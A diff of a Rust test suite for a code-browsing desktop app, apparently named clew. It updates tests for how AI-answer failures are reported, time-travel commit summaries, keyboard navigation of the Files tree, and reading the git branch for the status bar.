     let stream = retrieving(&mut app);
     let _ = app.on_ask_retrieved(stream, "why?".into(), false, None, Err("timed out".into()));
     assert_eq!(app.proj.ask_input, "why?", "the failed question comes back");
-    assert!(app.status.contains("timed out"), "{}", app.status);
+    // Said plainly (`tasks::plain_detail`).
+    assert!(
+        app.status.contains("no answer came in time"),
+        "{}",
+        app.status
+    );
 
     app.proj.ask_input = "a draft".into();
     let stream = retrieving(&mut app);
@@ -13759,37 +14961,97 @@ fn stop_aborts_a_local_provider_stream_and_closes_its_turn() {
 /// An agent turn that fails before doing anything falls back to retrieval —
 /// and when there is no index to retrieve from, the question stays in the
 /// conversation with the agent's own failure. It used to be removed first,
-/// so it vanished, and the status blamed the missing index alone.
+/// so it vanished, and the status blamed the missing index alone. Each is
+/// said once, where it is seen: with Ask open the failure in the
+/// conversation and why the index could not on the status line (it read
+/// " — <why>", a dash with nothing before it); with Ask put away the
+/// failure on the status line, with Try again (it was said there twice
+/// over, the notice and the status differing), why the index could not on
+/// the card's notice.
 #[test]
 fn an_agent_failure_with_nothing_to_fall_back_to_keeps_the_question() {
     // A service set up, and no index built with it yet.
     let _env = embeddings_at("ask-agent-fallback-data", "http://127.0.0.1:1/v1");
-    let mut app = scanned_app("ask-agent-fallback");
-    let stream = app.mint_request_id();
-    app.proj.ask_turns.push(AskTurn {
-        stream,
-        question: "where is auth?".into(),
-        spoken: false,
-        answer_md: String::new(),
-        answer: Vec::new(),
-        settled: 0,
-        sources: Vec::new(),
-        steps: Vec::new(),
-        streaming: true,
-        extras: Default::default(),
-    });
-    app.proj.link.agent_stream = Some(stream);
-    let _ = app.update(Message::Ask(AskMsg::AgentTurnEnded {
-        stamp: app.stamp(),
-        stream,
-        outcome: clew_protocol::StreamOutcome::Failed("401 bad key".into()),
-    }));
-    let turn = app.proj.ask_turns.last().expect("the question is kept");
-    assert_eq!(turn.question, "where is auth?");
-    assert!(!turn.streaming);
-    assert!(turn.answer_md.contains("401 bad key"), "{}", turn.answer_md);
-    assert!(app.status.contains("401 bad key"), "{}", app.status);
-    assert!(app.status.contains("semantic index"), "{}", app.status);
+    for view in [AskView::Hidden, AskView::Compact] {
+        let mut app = scanned_app("ask-agent-fallback");
+        app.ask_view = view;
+        let stream = app.mint_request_id();
+        app.proj.ask_turns.push(AskTurn {
+            stream,
+            question: "where is auth?".into(),
+            spoken: false,
+            answer_md: String::new(),
+            answer: Vec::new(),
+            settled: 0,
+            draft_from: None,
+            sources: Vec::new(),
+            steps: Vec::new(),
+            streaming: true,
+            extras: Default::default(),
+        });
+        app.proj.link.agent_stream = Some(stream);
+        let _ = app.update(Message::Ask(AskMsg::AgentTurnEnded {
+            stamp: app.stamp(),
+            stream,
+            outcome: clew_protocol::StreamOutcome::Failed("the model is overloaded".into()),
+        }));
+        let turn = app.proj.ask_turns.last().expect("the question is kept");
+        assert_eq!(turn.question, "where is auth?");
+        assert!(!turn.streaming);
+        assert!(turn.answer_md.contains("overloaded"), "{}", turn.answer_md);
+        let notice = app.proj.ask_notice.clone().unwrap_or_default();
+        assert!(notice.contains("semantic index"), "{view:?}: {notice}");
+        assert!(!app.status.starts_with(" —"), "{view:?}: {}", app.status);
+        if view == AskView::Hidden {
+            assert!(app.status.contains("overloaded"), "{}", app.status);
+            let shown = app.failure_shown().expect("the failure stands");
+            assert_eq!(shown.said, app.status, "said once");
+            assert!(shown.retry.is_some(), "with Try again");
+        } else {
+            assert!(app.status.contains("semantic index"), "{}", app.status);
+            assert!(!app.status.contains("overloaded"), "{}", app.status);
+            assert!(app.failure_shown().is_none());
+        }
+    }
+}
+
+/// An agent turn failed because the provider could not be reached, or
+/// refused the key, does not fall back to the index: that answer is the
+/// same provider's, and failed the same way after as long again. The turn
+/// says the provider's failure at once.
+#[test]
+fn an_agent_failure_the_provider_would_repeat_does_not_fall_back() {
+    for reason in [
+        "request failed: Connection refused (os error 111)",
+        "HTTP 401: invalid api key",
+    ] {
+        let mut app = scanned_app("ask-agent-no-fallback");
+        let stream = app.mint_request_id();
+        app.proj.ask_turns.push(AskTurn {
+            stream,
+            question: "where is auth?".into(),
+            spoken: false,
+            answer_md: String::new(),
+            answer: Vec::new(),
+            settled: 0,
+            draft_from: None,
+            sources: Vec::new(),
+            steps: Vec::new(),
+            streaming: true,
+            extras: Default::default(),
+        });
+        app.proj.link.agent_stream = Some(stream);
+        let _ = app.update(Message::Ask(AskMsg::AgentTurnEnded {
+            stamp: app.stamp(),
+            stream,
+            outcome: clew_protocol::StreamOutcome::Failed(reason.into()),
+        }));
+        assert!(!app.proj.asking, "{reason}: fell back");
+        assert!(app.proj.inflight.ask_retrieval.is_none(), "{reason}");
+        let turn = app.proj.ask_turns.last().expect("the question is kept");
+        assert!(!turn.streaming && turn.extras.failed, "{reason}");
+        assert!(!app.status.contains("semantic index"), "{}", app.status);
+    }
 }
 
 /// A lost transport ends the Ask streams it carried, and only those: the
@@ -13821,6 +15083,7 @@ fn a_disconnect_closes_server_turns_with_their_text_and_spares_the_local_stream(
         answer_md: "Half an answer".into(),
         answer: Vec::new(),
         settled: 0,
+        draft_from: None,
         sources: Vec::new(),
         steps: Vec::new(),
         streaming: true,
@@ -13839,7 +15102,17 @@ fn a_disconnect_closes_server_turns_with_their_text_and_spares_the_local_stream(
     assert!(app.proj.inflight.ask_local.is_some());
     let closed = turn(remote);
     assert!(!closed.streaming);
-    assert_eq!(closed.answer_md, "Half an answer");
+    // What was written stays, and it is said where it stops that the rest
+    // could not come, with a way to ask again.
+    assert!(
+        closed.answer_md.starts_with("Half an answer")
+            && closed
+                .answer_md
+                .contains("Couldn't finish: server disconnected"),
+        "{}",
+        closed.answer_md
+    );
+    assert!(closed.extras.failed, "not to be asked again");
     assert!(
         !closed.answer.is_empty(),
         "the closed turn has nothing to show"
@@ -14023,6 +15296,146 @@ fn a_stop_holds_the_queue_and_send_now_asks() {
     );
 }
 
+/// A story's failure goes when the scope changes — its Try again did
+/// nothing in the whole file's scope — and a commit's Try again, the
+/// commit gone from the history shown, says so rather than nothing.
+#[test]
+fn time_travel_failures_go_with_the_scope_they_were_of() {
+    let mut app = scanned_app("tt-failure-scope");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    let commit = |sha: &str| git::HistCommit {
+        sha: sha.into(),
+        author: "a".into(),
+        time: 0,
+        subject: format!("subject {sha}"),
+        path: "src/lib.rs".into(),
+    };
+    let asked = app.await_history(root.join("src/lib.rs"), app.proj.active, false, "");
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Ready {
+        stamp: app.stamp(),
+        generation: asked,
+        abs: root.join("src/lib.rs"),
+        rel: "src/lib.rs".into(),
+        lang: None,
+        scope: TimeScope::Symbol {
+            name: "origin".into(),
+            kind: "fn".into(),
+            start: 3,
+            end: 5,
+            ordinal: 0,
+        },
+        commits: Ok(vec![commit("aaaa1111"), commit("bbbb2222")]),
+    }));
+    let session = app.proj.time_travel.as_ref().expect("a session").session;
+    let _story = app.update(Message::TimeTravel(TimeTravelMsg::Story));
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::StoryDone {
+        stamp: app.stamp(),
+        session,
+        result: Err("boom".into()),
+    }));
+    assert_eq!(
+        app.failure_shown().map(|f| f.of),
+        Some(crate::app::state::FailureOf::Story)
+    );
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::ToggleScope));
+    assert!(
+        app.failure_shown().is_none(),
+        "left standing with the scope gone"
+    );
+    // A commit no longer in the history: said.
+    app.status.clear();
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyOf {
+        session,
+        sha: "cccc3333".into(),
+    }));
+    assert!(
+        app.status.contains("no longer in this history"),
+        "{}",
+        app.status
+    );
+}
+
+/// R16-1/2: a summary's failure is said in its band only while the band
+/// is drawn — behind the overview it went unsaid — and a commit's answer
+/// takes away its own failure's notice only, not another commit's; a
+/// re-scope keeps the session, and the notice with it.
+#[test]
+fn a_summary_failure_is_said_until_its_own_commit_answers() {
+    let mut app = scanned_app("tt-why-elsewhere");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    let commit = |sha: &str| git::HistCommit {
+        sha: sha.into(),
+        author: "a".into(),
+        time: 0,
+        subject: format!("subject {sha}"),
+        path: "src/lib.rs".into(),
+    };
+    let asked = app.await_history(root.join("src/lib.rs"), app.proj.active, false, "");
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Ready {
+        stamp: app.stamp(),
+        generation: asked,
+        abs: root.join("src/lib.rs"),
+        rel: "src/lib.rs".into(),
+        lang: None,
+        scope: TimeScope::Symbol {
+            name: "origin".into(),
+            kind: "fn".into(),
+            start: 3,
+            end: 5,
+            ordinal: 0,
+        },
+        commits: Ok(vec![commit("aaaa1111"), commit("bbbb2222")]),
+    }));
+    let session = app.proj.time_travel.as_ref().expect("a session").session;
+    let done = |app: &App, sha: &str, result: Result<String, String>| {
+        Message::TimeTravel(TimeTravelMsg::WhyDone {
+            stamp: app.stamp(),
+            session,
+            sha: sha.into(),
+            result,
+        })
+    };
+    let retry_of = |app: &App| match app.failure_shown().map(|f| f.retry.clone()) {
+        Some(Some(Message::TimeTravel(TimeTravelMsg::WhyOf { sha, .. }))) => Some(sha),
+        _ => None,
+    };
+
+    // Asked, then the overview over the file: its band is drawn nowhere.
+    let _why = app.update(Message::TimeTravel(TimeTravelMsg::Why));
+    let _ = app.update(Message::Overview(OverviewMsg::Show));
+    assert!(crate::ui::time_travel_on_screen(&app).is_none());
+    let _ = app.update(done(&app, "aaaa1111", Err("rate limited".into())));
+    assert_eq!(
+        retry_of(&app).as_deref(),
+        Some("aaaa1111"),
+        "said nowhere behind the overview"
+    );
+
+    // Back on the file, another commit asked: its answer, failed in its
+    // band or come, leaves the first one's notice be.
+    let _ = app.update(Message::Overview(OverviewMsg::Close));
+    assert!(crate::ui::time_travel_on_screen(&app).is_some());
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Goto(1)));
+    let _why = app.update(Message::TimeTravel(TimeTravelMsg::Why));
+    let _ = app.update(done(&app, "bbbb2222", Err("rate limited".into())));
+    assert_eq!(retry_of(&app).as_deref(), Some("aaaa1111"));
+    let _why = app.update(Message::TimeTravel(TimeTravelMsg::Why));
+    let _ = app.update(done(&app, "bbbb2222", Ok("so".into())));
+    assert_eq!(retry_of(&app).as_deref(), Some("aaaa1111"));
+
+    // A re-scope keeps the session: the notice stands, and its Try again
+    // still asks about its commit.
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::ToggleScope));
+    assert_eq!(retry_of(&app).as_deref(), Some("aaaa1111"));
+
+    // Its own commit answered: it goes.
+    let _ = app.update(done(&app, "aaaa1111", Ok("because".into())));
+    assert!(app.failure_shown().is_none());
+}
+
 /// D1-3: a "what & why" summary and the story belong to the time-travel SESSION
 /// they were asked in. Scrubbing moves the per-step generation, and keying on
 /// it dropped the reply and left its spinner up for good; a failure must clear
@@ -14030,6 +15443,8 @@ fn a_stop_holds_the_queue_and_send_now_asks() {
 #[test]
 fn time_travel_summaries_survive_scrubbing_and_every_outcome_clears_the_spinner() {
     let mut app = scanned_app("tt-why-session");
+    // The file read, its session drawn: its band is on screen.
+    open_synchronously(&mut app, "src/lib.rs", None);
     let root = app.proj.project.as_ref().unwrap().root.clone();
     app.llm_config_cache = Some(Some(unreachable_llm()));
     let commit = |sha: &str| git::HistCommit {
@@ -14077,13 +15492,15 @@ fn time_travel_summaries_survive_scrubbing_and_every_outcome_clears_the_spinner(
     }));
     let t = app.proj.time_travel.as_ref().unwrap();
     assert_eq!(
-        t.why.get("aaaa1111").map(String::as_str),
+        t.why.get("aaaa1111").and_then(|r| r.as_deref().ok()),
         Some("because"),
         "a summary that outlived a scrub was dropped"
     );
     assert!(!t.why_loading && t.why_pending.is_empty());
 
-    // A failure clears the spinner too, and says why.
+    // A failure clears the spinner too, and says why — in its band, with
+    // Try again and Settings, while its commit is on screen: on the status
+    // bar as well, it was said twice.
     let _ = app.update(Message::TimeTravel(TimeTravelMsg::Goto(1)));
     let _why = app.update(Message::TimeTravel(TimeTravelMsg::Why));
     assert!(tt(&app).0);
@@ -14094,7 +15511,41 @@ fn time_travel_summaries_survive_scrubbing_and_every_outcome_clears_the_spinner(
         result: Err("rate limited".into()),
     }));
     assert!(!tt(&app).0, "a failed summary left its spinner up");
+    assert!(app.failure_shown().is_none(), "said twice");
+    // Kept with its commit, to be said in its band and asked again.
+    assert_eq!(
+        app.proj.time_travel.as_ref().unwrap().why.get("bbbb2222"),
+        Some(&Err("rate limited".to_string()))
+    );
+    let _again = app.update(Message::TimeTravel(TimeTravelMsg::Why));
+    assert!(tt(&app).0, "a failed summary is asked again");
+
+    // Scrubbed away before it failed: nowhere on screen says so but the
+    // status bar, which stands with its Try again — said only as passing
+    // text it had no controls, and was cut short after an older one.
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Goto(0)));
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyDone {
+        stamp: app.stamp(),
+        session,
+        sha: "bbbb2222".into(),
+        result: Err("rate limited".into()),
+    }));
     assert!(app.status.contains("rate limited"), "{}", app.status);
+    let notice = app.failure_shown().expect("a standing failure");
+    assert_eq!(notice.of, crate::app::state::FailureOf::Summary);
+    assert!(
+        matches!(
+            &notice.retry,
+            Some(Message::TimeTravel(TimeTravelMsg::WhyOf { session: s, sha }))
+                if *s == session && sha == "bbbb2222"
+        ),
+        "its Try again names the commit it failed on: {:?}",
+        notice.retry
+    );
+    assert_eq!(
+        notice.about, None,
+        "nothing about the base URL in a rate limit"
+    );
 
     // A reply from another session is not this one's.
     let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyDone {
@@ -14103,14 +15554,47 @@ fn time_travel_summaries_survive_scrubbing_and_every_outcome_clears_the_spinner(
         sha: "bbbb2222".into(),
         result: Ok("stale".into()),
     }));
+    assert!(!matches!(
+        app.proj.time_travel.as_ref().unwrap().why.get("bbbb2222"),
+        Some(Ok(_))
+    ));
     assert!(
-        !app.proj
-            .time_travel
-            .as_ref()
-            .unwrap()
-            .why
-            .contains_key("bbbb2222")
+        app.failure_shown().is_some(),
+        "a stale reply took the failure away"
     );
+
+    // Its Try again asks about the commit that failed, shown again — not
+    // the one scrubbed to meanwhile, which it paid to summarize unasked.
+    let retry = app
+        .failure_shown()
+        .and_then(|n| n.retry.clone())
+        .expect("its Try again");
+    let _ = app.update(retry);
+    let t = app.proj.time_travel.as_ref().unwrap();
+    assert_eq!(t.idx, 1, "the commit it failed on, on screen again");
+    assert!(t.why_pending.contains("bbbb2222"), "{:?}", t.why_pending);
+    // Failed again with its band on screen: the band says it, and the
+    // status bar's notice goes.
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyDone {
+        stamp: app.stamp(),
+        session,
+        sha: "bbbb2222".into(),
+        result: Err("rate limited".into()),
+    }));
+    assert!(app.failure_shown().is_none(), "said twice");
+    // One summarized takes it away.
+    let _again = app.update(Message::TimeTravel(TimeTravelMsg::Why));
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyDone {
+        stamp: app.stamp(),
+        session,
+        sha: "bbbb2222".into(),
+        result: Ok("so".into()),
+    }));
+    assert!(matches!(
+        app.proj.time_travel.as_ref().unwrap().why.get("bbbb2222"),
+        Some(Ok(_))
+    ));
+    assert!(app.failure_shown().is_none());
 
     // The story: a failure after a scrub clears its spinner; a success shows.
     let _story = app.update(Message::TimeTravel(TimeTravelMsg::Story));
@@ -14127,6 +15611,14 @@ fn time_travel_summaries_survive_scrubbing_and_every_outcome_clears_the_spinner(
         "{}",
         app.status
     );
+    // It stands on the status bar with its Try again, as every AI
+    // failure does: it was the raw error, grey, with nothing to do.
+    let notice = app.failure_shown().expect("a standing failure");
+    assert_eq!(notice.of, crate::app::state::FailureOf::Story);
+    assert!(matches!(
+        notice.retry,
+        Some(Message::TimeTravel(TimeTravelMsg::Story))
+    ));
     let _story = app.update(Message::TimeTravel(TimeTravelMsg::Story));
     let _ = app.update(Message::TimeTravel(TimeTravelMsg::StoryDone {
         stamp: app.stamp(),
@@ -14135,6 +15627,24 @@ fn time_travel_summaries_survive_scrubbing_and_every_outcome_clears_the_spinner(
     }));
     let t = app.proj.time_travel.as_ref().unwrap();
     assert!(!t.story_loading && t.story.is_some());
+    assert!(
+        app.failure_shown().is_none(),
+        "a story written left the failure up"
+    );
+
+    // A summary's failure goes with its session: its Try again, standing
+    // after Time Travel was left, had nothing to ask about.
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Why));
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Goto(1)));
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyDone {
+        stamp: app.stamp(),
+        session,
+        sha: "aaaa1111".into(),
+        result: Err("rate limited".into()),
+    }));
+    assert!(app.failure_shown().is_some());
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Exit));
+    assert!(app.failure_shown().is_none(), "it outlived Time Travel");
 }
 
 /// With a past revision of the file on screen, ⌘D and "trace this value"
@@ -14158,6 +15668,7 @@ fn bookmarks_and_traces_wait_out_a_past_revision_on_screen() {
         scroll_x: 0.0,
         caret: None,
         focus_line: None,
+        reveal_change: false,
         loading: false,
         generation: app.proj.time_gen,
         session: app.proj.time_gen,
@@ -14544,6 +16055,214 @@ fn the_files_view_learns_what_the_working_tree_changes() {
     assert!(app.sync_git_status().is_some(), "read as it shows");
 }
 
+/// The Files view's tree walked by the keyboard: ↑ ↓ from row to row, →
+/// opening a folder and stepping into it, ← closing it and stepping out,
+/// Home and End, Space showing a file with the keyboard still in the tree,
+/// Enter reading it, Esc giving the keyboard back to the code, a letter
+/// narrowing the tree — and, narrowed, ↓ from the filter resting on the
+/// first file it lists.
+#[test]
+fn the_keyboard_walks_the_files_tree() {
+    use crate::app::message::TreeKey;
+    let mut app = scanned_app("tree-keys");
+    app.show_left_sidebar = true;
+    app.sidebar = SidebarTab::Files;
+    app.proj.expanded.clear();
+    let key = |app: &mut App, k: TreeKey| {
+        let task = app.update(Message::Window(WindowMsg::TreeKey(k)));
+        for m in run_task(task) {
+            let _ = app.update(m);
+        }
+    };
+    let at = |app: &App| app.tree_cursor_rel();
+    assert_eq!(at(&app), None, "the tree does not have the keyboard");
+    app.code_focused = true;
+    let _ = app.update(Message::Window(WindowMsg::TreeFocused(true)));
+    assert!(!app.code_focused, "the keys are the tree's");
+    // No file read yet: the first row.
+    assert_eq!(at(&app).as_deref(), Some("src"));
+    key(&mut app, TreeKey::Down);
+    assert_eq!(at(&app).as_deref(), Some("notes.txt"));
+    key(&mut app, TreeKey::Down);
+    assert_eq!(at(&app).as_deref(), Some("notes.txt"), "the last row stays");
+    key(&mut app, TreeKey::Up);
+    assert_eq!(at(&app).as_deref(), Some("src"));
+    // → opens a closed folder, then steps into it.
+    key(&mut app, TreeKey::Right);
+    assert!(app.proj.expanded.contains("src"));
+    assert_eq!(at(&app).as_deref(), Some("src"));
+    key(&mut app, TreeKey::Right);
+    assert_eq!(at(&app).as_deref(), Some("src/lib.rs"));
+    // ← steps out to the folder, then closes it.
+    key(&mut app, TreeKey::Left);
+    assert_eq!(at(&app).as_deref(), Some("src"));
+    key(&mut app, TreeKey::Left);
+    assert!(!app.proj.expanded.contains("src"));
+    key(&mut app, TreeKey::Last);
+    assert_eq!(at(&app).as_deref(), Some("notes.txt"));
+    key(&mut app, TreeKey::First);
+    assert_eq!(at(&app).as_deref(), Some("src"));
+    // Enter on a folder opens it, as a click does.
+    key(&mut app, TreeKey::Open);
+    assert!(app.proj.expanded.contains("src"));
+    // Space shows a file, the keyboard staying in the tree.
+    key(&mut app, TreeKey::Down);
+    key(&mut app, TreeKey::Preview);
+    assert_eq!(
+        app.active_viewer().map(|v| v.rel.as_str()),
+        Some("src/lib.rs")
+    );
+    assert!(!app.code_focused, "still the tree's");
+    assert_eq!(at(&app).as_deref(), Some("src/lib.rs"));
+    // Enter reads a file: the keyboard goes to its code.
+    key(&mut app, TreeKey::Down);
+    key(&mut app, TreeKey::Open);
+    assert_eq!(
+        app.active_viewer().map(|v| v.rel.as_str()),
+        Some("notes.txt")
+    );
+    assert!(app.code_focused, "the code's");
+    // Esc gives the keyboard back to the code, and does nothing else.
+    let _ = app.update(Message::Window(WindowMsg::TreeFocused(true)));
+    key(&mut app, TreeKey::Leave);
+    assert!(app.code_focused);
+    assert!(app.escape_taken);
+    app.escape_taken = false;
+    // A letter narrows the tree: the filter takes it.
+    key(&mut app, TreeKey::Type('l'));
+    assert_eq!(app.file_filter, "l");
+    app.file_filter = "lib".into();
+    let _ = app.update(Message::Window(WindowMsg::FileFilterDown));
+    let _ = app.update(Message::Window(WindowMsg::TreeFocused(true)));
+    assert_eq!(
+        at(&app).as_deref(),
+        Some("src/lib.rs"),
+        "the first it lists"
+    );
+}
+
+/// The tree's keyboard does not outlast the tree: hidden, the keys go back
+/// to the code. ↑ on the first row goes back up to the filter, and Esc in
+/// the filter gives the keys to the code.
+#[test]
+fn the_trees_keys_go_back_when_it_goes() {
+    use crate::app::message::TreeKey;
+    let mut app = scanned_app("tree-keys-gone");
+    app.show_left_sidebar = true;
+    app.sidebar = SidebarTab::Files;
+    let _ = app.update(Message::Window(WindowMsg::TreeFocused(true)));
+    assert!(!app.code_focused);
+    let _ = app.update(Message::Window(WindowMsg::ToggleLeftSidebar));
+    assert!(!app.tree_focused, "no tree, no keys of its");
+    assert!(app.code_focused, "the code's again");
+    let _ = app.update(Message::Window(WindowMsg::ToggleLeftSidebar));
+    // ↑ on the first row: the filter.
+    let _ = app.update(Message::Window(WindowMsg::TreeFocused(true)));
+    let _ = app.update(Message::Window(WindowMsg::TreeKey(TreeKey::First)));
+    let _ = app.update(Message::Window(WindowMsg::TreeKey(TreeKey::Up)));
+    assert_eq!(app.region, crate::app::keys::Region::Sidebar);
+    // Esc in the filter: the code's.
+    let _ = app.update(Message::Window(WindowMsg::FileFilterEscaped));
+    assert!(app.code_focused);
+    assert_eq!(app.region, crate::app::keys::Region::Code);
+}
+
+/// Opening a project in a repository reads its branch by itself: the read
+/// rides out with the opening, and its answer lands in the status bar.
+#[test]
+fn opening_a_project_reads_its_branch() {
+    let root = fixture_project("git-head-open");
+    let git = |args: &[&str]| {
+        let done = std::process::Command::new("git")
+            .args(["-c", "user.name=clew", "-c", "user.email=clew@test"])
+            .args(args)
+            .current_dir(&root)
+            .output()
+            .expect("git runs");
+        assert!(done.status.success(), "git {args:?}: {done:?}");
+    };
+    git(&["init", "-q", "-b", "trunk"]);
+    git(&["add", "-A"]);
+    git(&["commit", "-q", "-m", "one"]);
+    let mut app = blank_app();
+    app.scanning = true;
+    app.pending_scan_root = Some(root.clone());
+    let opened = app.update(Message::Project(ProjectMsg::ScanDone {
+        stamp: app.transport_stamp(),
+        result: fs_scan::scan(root.clone()),
+        report: Default::default(),
+    }));
+    assert!(app.proj.head_loading, "asked as it opened");
+    for m in run_task(opened) {
+        if matches!(m, Message::Project(ProjectMsg::HeadRead { .. })) {
+            let _ = app.update(m);
+        }
+    }
+    assert_eq!(
+        app.proj.head,
+        Some(clew_protocol::HeadName::Branch("trunk".into()))
+    );
+}
+
+/// What HEAD is, read for the status bar as the project opens, anew when
+/// the window comes back to the front or a file changes, one read at a
+/// time; outside a repository, no branch — not the one read before.
+#[test]
+fn the_status_bar_learns_the_branch_checked_out() {
+    use clew_protocol::HeadName;
+    let mut app = scanned_app("git-head-bar");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let git = |args: &[&str]| {
+        let done = std::process::Command::new("git")
+            .args(["-c", "user.name=clew", "-c", "user.email=clew@test"])
+            .args(args)
+            .current_dir(&root)
+            .output()
+            .expect("git runs");
+        assert!(done.status.success(), "git {args:?}: {done:?}");
+    };
+    let read = |app: &mut App| {
+        app.proj.head_loading = false;
+        app.proj.head_stale = true;
+        let task = app.sync_head().expect("a read");
+        for m in run_task(task) {
+            let _ = app.update(m);
+        }
+    };
+    read(&mut app);
+    assert_eq!(app.proj.head, None, "not a repository");
+
+    git(&["init", "-q", "-b", "trunk"]);
+    git(&["add", "-A"]);
+    git(&["commit", "-q", "-m", "one"]);
+    read(&mut app);
+    assert_eq!(app.proj.head, Some(HeadName::Branch("trunk".into())));
+    git(&["checkout", "-q", "--detach"]);
+    read(&mut app);
+    assert!(matches!(app.proj.head, Some(HeadName::Detached(_))));
+
+    // Read once; asked again only when HEAD may have moved.
+    assert!(app.sync_head().is_none(), "nothing changed since");
+    let _ = app.update(Message::Window(WindowMsg::FocusChanged(true)));
+    assert!(
+        app.proj.head_stale || app.proj.head_loading,
+        "back in front"
+    );
+    app.proj.head_stale = false;
+    app.proj.repo_tip_stale = false;
+    app.proj.head_loading = false;
+    let _ = app.on_files_changed(vec![root.join("src/lib.rs")]);
+    assert!(app.proj.head_stale, "a file changed");
+    // One at a time: while a read is on its way, none other.
+    app.proj.head_loading = true;
+    assert!(app.sync_head().is_none());
+
+    // No longer a repository: the branch read before is not kept.
+    std::fs::remove_dir_all(root.join(".git")).unwrap();
+    read(&mut app);
+    assert_eq!(app.proj.head, None);
+}
+
 /// D1-19: git failing is reported as a failure. A history that could not be
 /// read is not "No git history", and a revision git could not produce is not
 /// shown as an empty file.
@@ -14756,6 +16475,18 @@ fn a_watcher_batch_is_parsed_off_the_update_loop_and_applied_only_to_its_own_byt
         has(&mut app, "newest") && !has(&mut app, "parsed_later"),
         "a late parse of older bytes rolled the index back"
     );
+    // Rewritten as a minifier writes — one line of many thousand names —
+    // it is indexed empty, as the full build indexes it: none of its names
+    // in the finder or the call graph.
+    let minified = "pub fn packed_name() {} ".repeat(2_000);
+    assert!(clew_core::fs_scan::is_minified_source(&minified));
+    let packed = rehashed(&app, vec![modified(&abs, 7373, &minified)]);
+    apply_rehash(&mut app, packed);
+    assert!(
+        !has(&mut app, "packed_name"),
+        "a minified file indexed in full"
+    );
+    assert!(!has(&mut app, "newest"), "its old names kept");
 }
 
 /// A1 / D1-4 at scale: indexing a large project installs every file's
@@ -15778,7 +17509,7 @@ fn the_maps_overlay_reads_a_local_projects_maps_when_they_are_stale() {
             .find(|n| n.label == "users")
             .unwrap()
             .detail,
-        "id int · primary key\nemail text"
+        "id int (primary key)\nemail text"
     );
 }
 
@@ -17016,7 +18747,7 @@ async fn one_function_a_server_fails_is_left_unrefined_and_the_rest_kept() {
         format!("Call graph refined with LSP — {unrefined}")
     );
     let label = app.precise_label().expect("refined");
-    assert!(label.contains(" · 1 function unrefined"), "{label}");
+    assert!(label.contains("; 1 function unrefined"), "{label}");
     assert_eq!(
         python.prepared(4),
         1,
@@ -17918,7 +19649,7 @@ async fn a_refine_with_a_server_down_says_what_it_covers() {
     );
     settle_graphs(&mut app, refine);
     assert!(app.proj.project_calls.precise, "precondition: refined");
-    let badge = "● LSP-precise: Rust · Python left out";
+    let badge = "● LSP-precise: Rust; Python left out";
     let mut header =
         iced_test::simulator(crate::ui::project_graph_modal(&app, Overlay::ProjectCalls));
     assert!(header.find(badge).is_ok(), "{:?}", app.precise_label());
@@ -17960,7 +19691,7 @@ async fn what_a_refinement_leaves_out_follows_the_project() {
     settle_graphs(&mut app, batch);
     assert_eq!(
         app.precise_label().as_deref(),
-        Some("● LSP-precise: Rust · Python left out")
+        Some("● LSP-precise: Rust; Python left out")
     );
     let summary = app.precise_summary().unwrap_or_default();
     assert!(
@@ -18242,7 +19973,7 @@ fn a_landing_lays_the_open_map_out_off_the_update_loop() {
         Overlay::ProjectImports,
     )));
     let says = iced_test::simulator(crate::ui::graph_map_view(&app))
-        .find("Laying out the map…")
+        .find("Laying out the graph…")
         .is_ok();
     assert!(says, "the Imports map drew the Calls map's layout");
     settle_layouts(&mut app, opened);
@@ -19537,6 +21268,86 @@ fn a_diff_toggle_while_loading_cancels_and_a_git_failure_is_not_no_changes() {
     assert!(app.status.is_empty(), "{}", app.status);
 }
 
+/// What only the language server answers is offered only with it: a Rust
+/// file's Expand Macro, with no server, was pressed and said only that
+/// none was running.
+#[test]
+fn expand_macro_waits_for_the_server() {
+    let mut app = scanned_app("macro-no-server");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let menu = |served| ContextMenu {
+        pane: 0,
+        line: 2,
+        col: 4,
+        x: 10.0,
+        y: 10.0,
+        insight: Some(crate::InsightKind::ExpandMacro),
+        served,
+        by_pointer: true,
+        line_top: None,
+    };
+    let offered = |app: &App| {
+        crate::ui::heard::gather(app)
+            .iter()
+            .any(|t| t.title == "Expand Macro")
+    };
+    // Not asked here whether to download a server: the menu on top.
+    app.proj.pending_lsp_consent = Default::default();
+    app.proj.context_menu = Some(menu(false));
+    assert!(!offered(&app), "no server: not offered");
+    app.proj.context_menu = Some(menu(true));
+    assert!(offered(&app), "its server up: offered");
+}
+
+/// Refine with LSP, no server running and a file open, says where one is
+/// started — not "open a file", with one open.
+#[test]
+fn refine_with_no_server_says_where_to_start_one() {
+    let mut app = scanned_app("refine-no-server");
+    let _ = app.refine_project_calls();
+    assert!(app.status.contains("open a file"), "{}", app.status);
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let _ = app.refine_project_calls();
+    assert!(app.status.contains("Settings"), "{}", app.status);
+    assert!(!app.status.contains("open a file"), "{}", app.status);
+}
+
+/// The file's Explain, with no note written of it and no model to write
+/// one, goes where a key is added — as every other way to explain does —
+/// rather than show "Not explained yet." and no more.
+#[test]
+fn explain_with_no_model_says_where_to_add_one() {
+    let mut app = scanned_app("explain-no-key");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    assert!(app.llm_config().is_none(), "no model set up");
+    let abs = app.active_viewer().unwrap().abs.clone();
